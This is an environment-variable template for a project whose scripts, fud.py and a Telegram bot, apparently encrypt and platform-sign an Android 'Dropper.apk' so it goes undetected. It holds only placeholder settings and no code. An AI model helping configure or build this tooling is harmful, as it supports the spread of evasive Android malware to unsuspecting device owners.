# Copy this file to .env and fill in your values.
# .env is gitignored — never commit it with real credentials.

# ── fud.py ───────────────────────────────────────────────────────────────────
AES_KEY=<64-char hex string — 32 random bytes>
DROPPER_APK=Dropper.apk
PLATFORM_KEY=key.pk8
PLATFORM_CERT=certificate.pem
PBKDF2_ITERATIONS=65536

# ── bot.py ───────────────────────────────────────────────────────────────────
# Token from @BotFather
BOT_TOKEN=

# Comma-separated admin chat IDs (get yours from @userinfobot)
ADMIN_IDS=

# MongoDB Atlas URI (optional — omit to use local BOT_DB/*.json)
MONGO_URI=

# 1 = use MongoDB Atlas, 0 = local JSON files (default)
USE_MONGO=0
